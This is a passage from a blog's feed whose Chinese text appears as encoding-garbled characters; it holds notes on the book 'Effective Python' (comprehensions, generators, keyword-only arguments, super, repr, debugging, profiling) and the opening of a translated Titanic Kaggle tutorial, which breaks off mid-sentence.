class="line">[1,9,7]</span><br></pre></td></tr></table></figure><h3><span id="6-bu-jin-shi-qie-ge">6. æ­¥è¿›å¼åˆ‡å‰²</span></h3><ol><li>é¿å…åœ¨ä¸€ä¸ªåˆ‡ç‰‡æ“ä½œä¸­åŒæ—¶ä½¿ç”¨ <code>start</code>ï¼Œ<code>end</code>å’Œ<code>stride</code>ï¼›</li><li>é¿å…ä½¿ç”¨è´Ÿæ•°åšstrideï¼›</li></ol><h3><span id="7-yong-lie-biao-tui-dao-dai-ti-map-he-filter">7. ç”¨åˆ—è¡¨æ¨å¯¼ä»£æ›¿mapå’Œfilter</span></h3><ol><li>list, å­—å…¸å’Œé›†åˆæ”¯æŒåˆ—è¡¨æ¨å¯¼ï¼›</li><li>ä»£ç æ¸…æ™°ï¼›</li></ol><h3><span id="8-bu-yao-shi-yong-han-you-liang-ge-yi-shang-biao-da-shi-de-lie-biao-tui-dao">8. ä¸è¦ä½¿ç”¨å«æœ‰ä¸¤ä¸ªä»¥ä¸Šè¡¨è¾¾å¼çš„åˆ—è¡¨æ¨å¯¼</span></h3><p>ä¼šå˜å¾—éš¾ç†è§£</p><h3><span id="9-yong-sheng-cheng-qi-biao-da-shi-lai-gai-xie-shu-ju-liang-jiao-da-de-lie-biao-tui-dao-shi">9. ç”¨ç”Ÿæˆå™¨è¡¨è¾¾å¼æ¥æ”¹å†™æ•°æ®é‡è¾ƒå¤§çš„åˆ—è¡¨æ¨å¯¼å¼</span></h3><ol><li><p>æ•°æ®é‡è¾ƒå¤§æ—¶ï¼Œåˆ—è¡¨æ¨å¯¼å¼ä¼šå ç”¨å¤§é‡å†…å­˜</p></li><li><p><code>()</code></p></li></ol><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a_long_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">value = [<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> a_long_list]</span><br><span class="line"><span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure><p>=&gt;</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">value = (<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> a_long_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(value))</span><br></pre></td></tr></table></figure><ol start="3"><li>å¯ä»¥ç»„åˆ</li></ol><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">roots = ((v, v ** <span class="number">0.5</span>)<span class="keyword">for</span> v <span class="keyword">in</span> value)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(roots))</span><br></pre></td></tr></table></figure><h3><span id="10-range-gt-enumerate">10. <code>range</code> =&gt; <code>enumerate</code></span></h3><p><code>enumerate</code> å¯ä»¥æŠŠå„ç§è¿­ä»£å™¨åŒ…è£…æˆç”Ÿæˆå™¨ï¼Œä»¥ä¾¿ç¨åäº§ç”Ÿè¾“å‡ºå€¼ã€‚<code>enumerate</code> è®¡æ•°ä¸‹è¡¨é»˜è®¤ä» <code>0</code> å¼€å§‹ï¼Œå¯ä»¥ä¿®æ”¹ã€‚</p><h3><span id="11-yong-zip-tong-shi-bian-li-liang-ge-die-dai-qi">11. ç”¨ <code>zip</code> åŒæ˜¯éå†ä¸¤ä¸ªè¿­ä»£å™¨</span></h3><ol><li>è¿­ä»£å™¨é•¿åº¦ç›¸åŒ</li><li>ä¸åŒæ—¶ä½¿ç”¨ <code>itertools.zip_longest</code></li></ol><h3><span id="12-bu-yao-zai-for-he-while-xun-huan-hou-mian-xie-else">12. ä¸è¦åœ¨ <code>for</code> å’Œ <code>while</code> å¾ªç¯åé¢å†™ <code>else</code></span></h3><p>ä¸ <code>if/else</code>, <code>try/except/else</code> çš„ <code>else</code> ä¸åŒï¼Œå®¹æ˜“è¯¯è§£</p><h3><span id="13-try-except-else-finally">13. <code>try/except/else/finally</code></span></h3><ol><li><code>finally</code>å—ï¼šæ—¢è¦å°†å¼‚å¸¸å‘ä¸Šä¼ æ’­ï¼Œåˆè¦åœ¨å¼‚å¸¸å‘ç”Ÿæ—¶åšæ¸…ç†å·¥ä½œ</li><li><code>ry/except/else</code>ï¼šexceptä½¿å¼‚å¸¸ä¼ æ’­å˜å¾—æ¸…æ™°ï¼Œelseä¾¿äºè‡ªå·±å¤„ç†ä»£ç </li></ol><h3><span id="14-jin-liang-yong-yi-chang-lai-biao-shi-te-shu-qing-kuang-er-bu-yao-fan-hui-none">14. å°½é‡ç”¨å¼‚å¸¸æ¥è¡¨ç¤ºç‰¹æ®Šæƒ…å†µï¼Œè€Œä¸è¦è¿”å› <code>None</code></span></h3><p>æ¯”å¦‚é™¤ä»¥0æ—¶ï¼ŒæŠ›å‡ºå¼‚å¸¸</p><h3><span id="15-zai-bi-bao-zhong-shi-yong-wai-wei-zuo-yong-yu-zhong-de-bian-liang">15. åœ¨é—­åŒ…ä¸­ä½¿ç”¨å¤–å›´ä½œç”¨åŸŸä¸­çš„å˜é‡</span></h3><ol><li>Python3 è·å–é—­åŒ…ä¸­çš„å˜é‡ï¼š<code>nonlocal</code>ï¼Œä½†æ˜¯<code>nonlocal</code>ä¸èƒ½å»¶ä¼¸åˆ°æ¨¡å—çº§åˆ«ï¼›</li><li>Python2 ä¸­å¯ä»¥ä½¿ç”¨å¯å˜å€¼æ¥å®ç°ï¼Œæ¯”å¦‚åŒ…å«å•ä¸ªå…ƒç´ çš„åˆ—è¡¨ã€‚</li><li>é™¤éå‡½æ•°ç®€å•ï¼Œå°½é‡ä¸ä½¿ç”¨ <code>nonlocal</code></li></ol><h3><span id="16-kao-lu-yong-sheng-cheng-qi-gai-xie-zhi-jie-fan-hui-lie-biao-de-han-shu">16. è€ƒè™‘ç”¨ç”Ÿæˆå™¨æ”¹å†™ç›´æ¥è¿”å›åˆ—è¡¨çš„å‡½æ•°</span></h3><p><code>yield</code></p><h3><span id="17-zai-can-shu-shang-die-dai-shi-xu-yao-duo-jia-xiao-xin"><em>17. åœ¨å‚æ•°ä¸Šè¿­ä»£æ—¶éœ€è¦å¤šåŠ å°å¿ƒ</em></span></h3><ol><li>å‚æ•°æ˜¯è¿­ä»£å™¨æ—¶è¦å¤šåŠ æ³¨æ„ï¼›</li><li>è¿­ä»£å™¨åè®®ï¼šå®¹å™¨å’Œè¿­ä»£å™¨ï¼Œ<code>iter</code>ï¼Œ<code>next</code></li><li><code>__iter__</code></li><li>åˆ¤æ–­æ˜¯å¦ä¸ºè¿­ä»£å™¨ï¼š<code>iter(target) == iter(target)</code> ä¸ºTrueï¼Œåˆ™ä¸ºè¿­ä»£å™¨</li></ol><h3><span id="18-yong-shu-liang-ke-bian-de-wei-zhi-can-shu-jian-shao-shi-jue-hun-luan">18. ç”¨æ•°é‡å¯å˜çš„ä½ç½®å‚æ•°å‡å°‘è§†è§‰æ··ä¹±</span></h3><ol><li>æ˜Ÿå·å‚æ•°ï¼ˆ<code>*args</code>ï¼‰ï¼Œ<code>*</code>æ“ä½œç¬¦</li><li>å˜é•¿å‚æ•°åœ¨ä¼ ç»™å‡½æ•°æ—¶ï¼Œæ€»æ˜¯å…ˆè½¬åŒ–æˆå…ƒç»„ï¼Œå¦‚æœæ˜¯ç”Ÿæˆå™¨ï¼Œæ³¨æ„å†…å­˜ä½¿ç”¨ï¼›</li><li>æ·»åŠ æ–°å‚æ•°æ—¶ï¼Œéœ€è¦ä¿®æ”¹åŸæ¥å‡½æ•°ä½¿ç”¨ã€‚å¯ä½¿ç”¨å…³é”®å­—å½¢å¼æŒ‡å®šçš„å‚æ•°è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</li></ol><h3><span id="19-yong-guan-jian-zi-can-shu-biao-da-ke-xuan-xing-wei">19. ç”¨å…³é”®å­—å‚æ•°è¡¨è¾¾å¯é€‰è¡Œä¸º</span></h3><ol><li>ä½ç½®å‚æ•°å¿…å¿…é¡»å‡ºç°åœ¨å…³é”®å­—ä¹‹å‰ï¼›æ¯ä¸ªå‚æ•°åªèƒ½æŒ‡å®šä¸€æ¬¡ï¼›</li><li>å…³é”®å­—å‚æ•°ï¼›æ˜“è¯»ï¼Œå¯æä¾›é»˜è®¤å€¼ï¼Œæ‰©å……å‚æ•°æ–¹ä¾¿ï¼›</li></ol><h3><span id="20-yong-none-he-wen-dang-zi-fu-chuan-miao-shu-ju-you-dong-tai-mo-ren-zhi-de-can-shu">20. ç”¨<code>None</code>å’Œæ–‡æ¡£å­—ç¬¦ä¸²æè¿°å…·æœ‰åŠ¨æ€é»˜è®¤å€¼çš„å‚æ•°</span></h3><ol><li>å‚æ•°çš„é»˜è®¤å€¼ï¼Œåªä¼šåœ¨ç¨‹åºåŠ è½½æ¨¡å—å¹¶è¯»åˆ°æœ¬å‡½æ•°çš„å®šä¹‰æ—¶è¯„ä¼°ä¸€æ¬¡ï¼Œå¯¹äº<code>&#123;&#125;</code>ï¼Œ<code>[]</code>ç­‰åŠ¨æ€å€¼ä¼šå‡ºç°å¥‡æ€ªè¡Œä¸ºã€‚</li></ol><h3><span id="21-yong-zhi-neng-yi-guan-jian-zhi-xing-shi-zhi-ding-de-can-shu-lai-que-bao-dai-ma-ming-xi">21. ç”¨åªèƒ½ä»¥å…³é”®å€¼å½¢å¼æŒ‡å®šçš„å‚æ•°æ¥ç¡®ä¿ä»£ç æ˜æ™°</span></h3><p>Python 3 ä¸­ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">safe_division_before</span>(<span class="params">number, divisor, ignore_overflow=<span class="literal">False</span>, ignore_zero_divisor=<span class="literal">False</span></span>):</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>==&gt;</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">safe_division_after</span>(<span class="params">number, divisor, *, ignore_overflow=<span class="literal">False</span>, ignore_zero_divisor=<span class="literal">False</span></span>):</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>*</code> æ ‡è¯†ç€ä½ç½®å‚æ•°ç»“æŸï¼Œä¹‹åçš„å‚æ•°åªèƒ½ä»¥å…³é”®å­—å½¢å¼æŒ‡å®šã€‚</p><h3><span id="22-jin-liang-yong-fu-zhu-lei-lai-wei-hu-cheng-xu-zhuang-tai-er-bu-yong-zi-dian-he-yuan-zu">22. å°½é‡ç”¨è¾…åŠ©ç±»æ¥ç»´æŠ¤ç¨‹åºçŠ¶æ€ï¼Œè€Œä¸ç”¨å­—å…¸å’Œå…ƒç»„</span></h3><ol><li>ä¸ä½¿ç”¨åŒ…å«å­—å…¸çš„å­—å…¸æˆ–è€…è¿‡é•¿çš„å…ƒç»„ï¼›</li><li>å…·åå…ƒç»„ï¼š<code>collections.namedtuple</code>ï¼›</li></ol><h3><span id="23-jian-dan-de-jie-kou-ying-gai-jie-shou-han-shu-er-bu-shi-lei-de-shi-li">23. ç®€å•çš„æ¥å£åº”è¯¥æ¥å—å‡½æ•°ï¼Œè€Œä¸æ˜¯ç±»çš„å®ä¾‹</span></h3><ol><li>Pythonä¸­çš„å‡½æ•°æ˜¯ä¸€çº§å¯¹è±¡ï¼Œå‡½æ•°å’Œæ–¹æ³•å¯ä»¥åƒè¯­è¨€ä¸­çš„å…¶ä»–å€¼é‚£æ ·ä¼ é€’å’Œå¼•ç”¨ï¼›</li><li>ä¸¾ä¾‹ï¼š<ul><li><code>list</code>ç±»å‹çš„<code>sort</code>æ–¹æ³•</li><li><code>defaultdict</code></li></ul></li><li><code>__call__</code> ä½¿ç±»çš„å®ä¾‹åƒæ™®é€šå‡½æ•°é‚£æ ·è°ƒç”¨ï¼›</li><li>å¦‚æœè¦ç”¨å‡½æ•°ä¿å­˜çŠ¶æ€ï¼Œå°±åº”è¯¥å®šä¹‰æ–°çš„ç±»ï¼Œå¹¶ä»¤å…¶å®ç° <code>__call__</code> æ–¹æ³•ï¼Œè€Œä¸è¦å®šä¹‰å¸¦çŠ¶æ€çš„é—­åŒ…ã€‚</li></ol><h3><span id="24-yi-classmedtod-xing-shi-de-duo-tai-qu-tong-yong-di-gou-jian-dui-xiang">24. ä»¥ <code>@classmedtod</code> å½¢å¼çš„å¤šæ€å»é€šç”¨åœ°æ„å»ºå¯¹è±¡</span></h3><ol><li>æ¯ä¸ªç±»åªèƒ½æœ‰ä¸€ä¸ªæ„é€ å™¨ï¼Œå³ <code>__init__</code>ï¼›</li><li><code>@@classmedtod</code> æœºåˆ¶å¯ä»¥ç”¨ä¸€ç§ä¸æ„é€ å™¨ç›¸ä¼¼çš„æ–¹å¼æ„é€ ç±»å¯¹è±¡ï¼›</li></ol><h3><span id="25-yong-super-chu-shi-hua-fu-lei">25. ç”¨ <code>super</code> åˆå§‹åŒ–çˆ¶ç±»</span></h3><ol><li>Pythoné‡‡ç”¨æ ‡å‡†çš„æ–¹æ³•è§£æè§£æé¡ºåºæ¥è§£å†³ <em>è¶…ç±»åˆå§‹åŒ–æ¬¡åº</em> å’Œ <em>è±å½¢ç»§æ‰¿é—®é¢˜</em>ï¼›</li><li><code>super</code> åœ¨Python2å’ŒPython3ä¸ä¸€è‡´ï¼›</li></ol><p>Python 3 ä¸­ä»¥ä¸‹ä¸¤ç§æ–¹å¼æ•ˆæœç›¸åŒ</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Explicit</span>(<span class="title class_ inherited__">MyBaseClass</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="built_in">super</span>(__class__, self).__init__(value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Implicit</span>(<span class="title class_ inherited__">MyBaseClass</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(value)</span><br></pre></td></tr></table></figure><ol start="3"><li>æ€»æ˜¯åº”è¯¥ä½¿ç”¨å†…ç½®çš„ <code>super</code> å‡½æ•°æ¥åˆå§‹åŒ–çˆ¶ç±»ï¼›</li><li>ç±»çš„ <code>mro</code> æ–¹æ³•å¯ä»¥æŸ¥çœ‹æ–¹æ³•è§£æé¡ºåºï¼š<code>MyClass.mro()</code></li></ol><h3><span id="26-zhi-zai-shi-yong-mix-in-zu-jian-zhi-zuo-gong-ju-lei-shi-jin-xing-duo-chong-ji-cheng">26. åªåœ¨ä½¿ç”¨ Mix-in ç»„ä»¶åˆ¶ä½œå·¥å…·ç±»æ—¶è¿›è¡Œå¤šé‡ç»§æ‰¿</span></h3><ol><li>mix-in æ˜¯ä¸€ç§å°å‹ç±»ï¼Œå®ƒåªå®šä¹‰äº†å…¶ä»–ç±»å¯èƒ½éœ€è¦æä¾›çš„ä¸€å¥—é™„åŠ æ–¹æ³•ï¼Œè€Œä¸å®šä¹‰è‡ªå·±çš„å®ä¾‹å±æ€§ï¼Œå®ƒä¹Ÿä¸è¦æ±‚ä½¿ç”¨è€…è°ƒç”¨è‡ªå·±çš„ <code>__init__</code> æ„é€ å™¨ï¼›</li><li>èƒ½ç”¨ mix-in ç»„ä»¶å®ç°çš„æ•ˆæœï¼Œå°±ä¸è¦ç”¨å¤šé‡ç»§æ‰¿æ¥åšï¼›</li><li>å°†å„ä¸ªåŠŸèƒ½å®ç°ä¸ºå¯æ’æ‹”çš„ mix-in ç»„ä»¶ï¼Œç„¶åè®©ç›¸å…³ç±»ç»§æ‰¿è‡ªå·±éœ€è¦çš„ç»„ä»¶ï¼Œå³å¯å®šåˆ¶è¯¥ç±»å®ä¾‹æ‰€åº”å…·å¤‡çš„è¡Œä¸ºï¼›</li><li>ç®€å•è¡Œä¸ºå°è£…åˆ° mix-in ç»„ä»¶ä¸­ï¼Œç„¶åç”¨å¤šä¸ªç»„ä»¶ç»„åˆå‡ºå¤æ‚åŠŸèƒ½ã€‚</li></ol><h3><span id="27-duo-yong-public-shu-xing-shao-yong-private-shu-xing">27. å¤šç”¨ public å±æ€§ï¼Œå°‘ç”¨ private å±æ€§</span></h3><ol><li>Pythonè§£é‡Šå™¨æ— æ³•ä¸¥æ ¼ä¿è¯ private å­—æ®µçš„ç§å¯†æ€§ï¼ˆPythonä¸­ä¼šå°†ç±»çš„ private å±æ€§åç§°å˜åŒ–ä¸º <code>_&#123;ç±»åç§°&#125;__&#123;åŸprivateå±æ€§åç§°&#125;</code>ï¼‰ï¼›</li><li>ä¸è¦ç›²ç›®å°†å±æ€§è®¾ç½®ä¸º privateï¼Œè€Œæ˜¯ä¸€å¼€å§‹å°±åšå¥½è§„åˆ’ï¼Œå¹¶å…è®¸å­ç±»æ›´å¤šåœ°è®¿é—®è¶…ç±»å†…éƒ¨APIï¼›</li><li>å¤šç”¨ protected å±æ€§ï¼Œå¹¶åœ¨æ–‡æ¡£ä¸­å°†è¿™äº›å­—æ®µçš„åˆç†ç”¨æ³•å‘Šè¯‰å¼€å‘è€…ï¼Œè€Œä¸è¦è¯•å›¾ç”¨ private å±æ€§æ¥é™åˆ¶å­ç±»è®¿é—®ï¼›</li><li>åªæœ‰å½“å­ç±»ä¸å—è‡ªå·±æ§åˆ¶æ—¶ï¼Œæ‰å¯è€ƒè™‘ä½¿ç”¨ private å±æ€§é¿å…å†²çªã€‚</li></ol><h3><span id="28-ji-cheng-collections-abc-yi-shi-xian-zi-ding-yi-rong-qi-lei-xing">28. ç»§æ‰¿ <code>collections.abc</code> ä»¥å®ç°è‡ªå®šä¹‰å®¹å™¨ç±»å‹</span></h3><p>ç¼–å†™è‡ªå®šä¹‰å®¹å™¨ç±»å‹æ—¶ï¼Œä» <code>collections.abc</code> æ¨¡å—çš„æŠ½è±¡åŸºç±»ä¸­ç»§æ‰¿ï¼Œé‚£äº›åŸºç±»å¯ä»¥ç¡®ä¿å­ç±»å…·æœ‰é€‚å½“çš„æ¥å£å’Œè¡Œä¸ºã€‚</p><h3><span id="49-wei-mei-ge-han-shu-lei-he-mo-kuai-bian-xie-wen-dang-zi-fu-chuan">49. ä¸ºæ¯ä¸ªå‡½æ•°ã€ç±»å’Œæ¨¡å—ç¼–å†™æ–‡æ¡£å­—ç¬¦ä¸²</span></h3><ol><li>docstring</li></ol><h3><span id="54-mo-kuai-ji-bie-dai-ma-pei-zhi-bu-tong-de-bu-shu-huan-jing">54. æ¨¡å—çº§åˆ«ä»£ç é…ç½®ä¸åŒçš„éƒ¨ç½²ç¯å¢ƒ</span></h3><ol><li>ç¯å¢ƒå˜é‡</li><li><code>os</code>ï¼Œ<code>sys</code></li></ol><h3><span id="55-yong-repr-shu-chu-diao-shi-xin-xi">55. ç”¨ <code>repr</code> è¾“å‡ºè°ƒè¯•ä¿¡æ¯</span></h3><ol><li><code>print</code> æ˜“äºé˜…è¯»å­—ç¬¦ä¸²</li><li><code>repr</code> å¯ä¾›æ‰“å°å­—ç¬¦ä¸²ï¼Œ<code>eval</code> è¿˜åŸä¸ºåˆå§‹å€¼</li><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼š<code>%s</code> =&gt; str; <code>%r</code> =&gt; repr</li><li><code>__repr__</code> è‡ªå®šä¹‰å¯ä¾›æ‰“å°å­—ç¬¦ä¸²ï¼›</li><li><code>__dict__</code> ä»»æ„å¯¹è±¡æŸ¥è¯¢å®ä¾‹å­—å…¸ï¼›</li></ol><p>ç¤ºä¾‹ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(5)</span></span><br><span class="line">5</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(<span class="string">&#x27;5&#x27;</span>)</span></span><br><span class="line">5</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(repr(5))</span></span><br><span class="line">5</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(repr(<span class="string">&#x27;5&#x27;</span>))</span></span><br><span class="line">&#x27;5&#x27;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(<span class="string">&#x27;%s&#x27;</span> % 5)</span></span><br><span class="line">5</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(<span class="string">&#x27;%s&#x27;</span> % <span class="string">&#x27;5&#x27;</span>)</span></span><br><span class="line">5</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(<span class="string">&#x27;%r&#x27;</span> % 5)</span></span><br><span class="line">5</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; <span class="built_in">print</span>(<span class="string">&#x27;%r&#x27;</span> % <span class="string">&#x27;5&#x27;</span>)</span></span><br><span class="line">&#x27;5&#x27;</span><br></pre></td></tr></table></figure><h3><span id="56-unittest-ce-shi">56. unittest æµ‹è¯•</span></h3><p>è¦ç¡®ä¿ Python ç¨‹åºèƒ½æ­£å¸¸è¿è¡Œï¼Œå”¯ä¸€çš„æ–¹æ³•å°±æ˜¯ç¼–å†™æµ‹è¯•ã€‚Python è¯­è¨€åŠ¨æ€ç‰¹æ€§ï¼Œä¸€æ–¹é¢é˜»ç¢äº†é™æ€ç±»å‹æ£€æµ‹ï¼Œå¦ä¸€æ–¹é¢å´æœ‰åˆ©äºå¼€å‘è€…è¿›è¡Œæµ‹è¯•ã€‚</p><ol><li>æ–­è¨€ï¼ˆassertionï¼‰ï¼š<code>assertEqual</code>ï¼Œ<code>assertTrue</code>ï¼Œ<code>assertRaises</code></li><li>mock</li><li><code>setUp</code>ï¼Œ<code>tearDown</code></li><li>å•å…ƒæµ‹è¯•ï¼Œé›†æˆæµ‹è¯•</li></ol><h3><span id="57-pdb-jiao-hu-diao-shi">57. <code>pdb</code> äº¤äº’è°ƒè¯•</span></h3><p><code>import pdb; pdb.set_trace()</code></p><ol><li><code>bt</code>ï¼Œ<code>up</code>ï¼Œ<code>down</code></li><li><code>step</code>ï¼Œ<code>next</code>ï¼Œ<code>return</code>ï¼Œ<code>continue</code></li></ol><h3><span id="58-xing-neng-fen-xi">58. æ€§èƒ½åˆ†æ</span></h3><ol><li>Python æ€§èƒ½åˆ†æå·¥å…· <code>profile</code>ï¼š<code>profile</code>ï¼Œ<code>cProfile</code></li><li><code>runcall</code></li><li><code>Stats</code></li></ol><h3><span id="59-tracemalloc-nei-cun-shi-yong-ji-xie-lou">59. <code>tracemalloc</code> å†…å­˜ä½¿ç”¨åŠæ³„æ¼</span></h3><p>CPyhtonï¼šå¼•ç”¨è®¡æ•°ï¼Œgc</p><ol><li><code>gc.get_objects()</code></li><li><code>tracemalloc.take_snapshot()</code></li></ol><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ã€Šç¼–å†™é«˜è´¨é‡Pythonä»£ç çš„59ä¸ªæœ‰æ•ˆæ–¹æ³•ã€‹ç¬”è®°
    
    </summary>
    
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>å¦‚ä½•åœ¨ Titanic Kaggle Challenge ä¸­è·å¾—0.8134åˆ†</title>
    <link href="https://qiwihui.com/qiwihui-blog-55/"/>
    <id>https://qiwihui.com/qiwihui-blog-55/</id>
    <published>2019-12-02T10:14:46.000Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>åŸæ–‡ï¼š<a href="https://ahmedbesbes.com/how-to-score-08134-in-titanic-kaggle-challenge.html">How to score 0.8134 in Titanic Kaggle Challenge</a></p><p>ç”± Kaggle ä¸»æŒçš„<a href="https://www.kaggle.com/c/titanic/">æ³°å¦å°¼å…‹å·ç”Ÿå­˜æŒ‘æˆ˜èµ›</a>æ˜¯ä¸€é¡¹ç«èµ›ï¼Œå…¶ç›®æ ‡æ˜¯åŸºäºä¸€ç»„æè¿°ä¹˜å®¢çš„å˜é‡ï¼Œä¾‹å¦‚ä»–çš„å¹´é¾„ï¼Œæ€§åˆ«æˆ–ä¹˜å®¢åœ¨èˆ¹ä¸Šçš„ç­‰çº§ï¼Œæ¥é¢„æµ‹ç‰¹å®šä¹˜å®¢æ˜¯ç”Ÿå­˜æˆ–æ­»äº¡ã€‚</p><p>æˆ‘ä¸€ç›´åœ¨ç© Titanic æ•°æ®é›†ï¼Œæˆ‘æœ€è¿‘åœ¨å…¬å…±æ’è¡Œæ¦œä¸Šè·å¾—äº†0.8134çš„å‡†ç¡®åº¦åˆ†æ•°ã€‚å½“æˆ‘å†™è¿™ç¯‡æ–‡ç« æ—¶ï¼Œæˆ‘åœ¨æ‰€æœ‰ Kagglers ä¸­æ’åå‰4ï¼…ã€‚</p><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/score.png" alt="png"></p><p>è¿™ç¯‡æ–‡ç« å°†åˆ†äº«æˆ‘çš„è§£å†³æ–¹æ¡ˆã€‚</p><p>ä¸ºäº†ä½¿æœ¬æ•™ç¨‹æ›´å…·â€œå­¦æœ¯æ€§â€ä»¥ä¾¿ä»»ä½•äººéƒ½èƒ½ä»ä¸­å—ç›Šï¼Œæˆ‘å°†é¦–å…ˆä»æ¢ç´¢æ€§æ•°æ®åˆ†æï¼ˆEDAï¼‰å¼€å§‹ï¼Œç„¶åæˆ‘å°†éµå¾ªç‰¹å¾å·¥ç¨‹å¹¶æœ€ç»ˆå‘ˆç°æˆ‘è®¾ç½®çš„é¢„æµ‹æ¨¡å‹ã€‚</p><span id="more"></span><p>åœ¨è¿™ä¸ª jupyter ç¬”è®°æœ¬ä¸­ï¼Œæˆ‘å°†åœ¨æ¯ä¸ªçº§åˆ«çš„ç®¡é“ä¸­ä½¿ç”¨ Pythonã€‚</p><p>æœ¬æ•™ç¨‹æ¶‰åŠçš„ä¸»è¦åº“æ˜¯ï¼š</p><ul><li><strong>Pandas</strong> ç”¨äºæ•°æ®æ“ä½œå’Œæ¥å…¥ï¼ˆingestionï¼‰</li><li><strong>Matplotlib</strong> å’Œ <strong>seaborn</strong> ç”¨äºæ•°æ®å¯è§†åŒ–</li><li><strong>Numpy</strong> ç”¨äºå¤šç»´æ•°ç»„è®¡ç®—</li><li><strong>sklearn</strong> ç”¨äºæœºå™¨å­¦ä¹ å’Œé¢„æµ‹å»ºæ¨¡</li></ul><h3><span id="an-zhuang-guo-cheng">å®‰è£…è¿‡ç¨‹</span></h3><p>å®‰è£…è¿™äº›è½¯ä»¶åŒ…çš„ä¸€ç§éå¸¸ç®€å•çš„æ–¹æ³•æ˜¯ä¸‹è½½å¹¶å®‰è£… <a href="href=%22http://conda.pydata.org/docs/install/quick.html#os-x-miniconda-install">Conda</a>ï¼Œå®ƒæ˜¯å°†ä»¥ä¸Šæ‰€æœ‰åŒ…å°è£…èµ·æ¥çš„å‘è¡Œç‰ˆã€‚æ­¤å‘è¡Œç‰ˆé€‚ç”¨äºæ‰€æœ‰å¹³å°ï¼ˆWindowsï¼ŒLinux å’Œ Mac OSXï¼‰ã€‚</p><h3><span id="te-bie-zhu-yi">ç‰¹åˆ«æ³¨æ„</span></h3><p>è¿™æ˜¯æˆ‘ä½œä¸ºåšä¸»å’Œæœºå™¨å­¦ä¹ ä»ä¸šè€…çš„ç¬¬ä¸€æ¬¡å°è¯•ã€‚</p><p>å¦‚æœæ‚¨å¯¹æˆ‘æ‰€åšçš„ä»£ç æˆ–å‡è®¾æœ‰ç–‘é—®ï¼Œè¯·ä¸è¦çŠ¹è±«ï¼Œåœ¨ä¸‹é¢çš„è¯„è®ºéƒ¨åˆ†å‘è¡¨è¯„è®ºã€‚</p><p>å¦‚æœæ‚¨å¯¹å¦‚ä½•æ”¹è¿›ç¬”è®°æœ¬ç”µè„‘ä¹Ÿæœ‰å»ºè®®ï¼Œè¯·è”ç³»æˆ‘ã€‚</p><p>æœ¬æ•™ç¨‹å¯åœ¨æˆ‘çš„ <a href="https://github.com/ahmedbesbes/How-to-score-0.8134-in-Titanic-Kaggle-Challenge">github</a> å¸æˆ·ä¸­æ‰¾åˆ°ã€‚</p><blockquote><p>è¯‘è€…æ³¨ï¼šæœ¬ç¿»è¯‘åœ¨ <a href="https://github.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge">qiwihui</a> ä¸‹ã€‚</p></blockquote><p>å¸Œæœ›ä½ å·²ç»åœ¨è®¡ç®—æœºä¸Šè®¾ç½®äº†æ‰€æœ‰å†…å®¹ã€‚è®©æˆ‘ä»¬å¼€å§‹å§ã€‚</p><h2><span id="i-tan-suo-xing-shu-ju-fen-xi">I - æ¢ç´¢æ€§æ•°æ®åˆ†æ</span></h2><p>æ­£å¦‚åœ¨ä¸åŒçš„æ•°æ®é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬å°†é¦–å…ˆå¼€å§‹æ·±å…¥ç 